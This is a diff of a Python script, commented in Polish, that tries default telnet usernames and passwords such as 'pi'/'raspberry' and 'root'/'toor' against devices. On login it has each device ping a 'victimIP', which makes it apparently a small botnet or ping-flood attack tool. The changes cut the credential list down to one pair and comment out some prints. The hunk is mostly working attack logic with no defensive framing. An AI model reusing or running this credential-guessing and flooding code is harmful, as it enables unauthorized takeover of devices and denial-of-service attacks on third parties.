@@ -10,8 +10,10 @@ attack = False
 
 def telnetConnect(ip_address, victimIP, attackType: int):
     # można zrobić pętlę do wczytywania user credentials z pliku
-    users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
-    passwords = ['1234', 'toor', 'admin', 'Ciumcium', 'root', 'user', 'raspberry']
+    #users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
+    #passwords = ['Ciumcium', 'toor', 'admin', '1234', 'root', 'user', 'raspberry']
+    users = ['pi']
+    passwords = ['Ciumcium']
     #print("telnet works")
     for user in users:
         print('connecting with login: ' + user)
@@ -41,7 +43,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 continue
 
             if attackType == 1:  # note
-                print('pingujemy..')
+                #print('pingujemy..')
                 tn.write(b"ping " + str(victimIP).encode('ascii') + b"\n")  # można zrobić wątki
                 #tn.write(b"ping 192.168.100.19 \n")
                 if not attack:  # tu też
@@ -58,7 +60,7 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
                 if not attack:  # zrobić wątek sprawdzający czy przerwac atatak thread()
                     # print(tn.write(b"exit"))  # jak wyjść z wykonującego sie skryptu?!?!
-                    tn.write(telnetlib.IP)  # chyba tak
+                    #tn.write(telnetlib.IP)  # chyba tak
                     return
 
                 tn.write(b"exit\n")
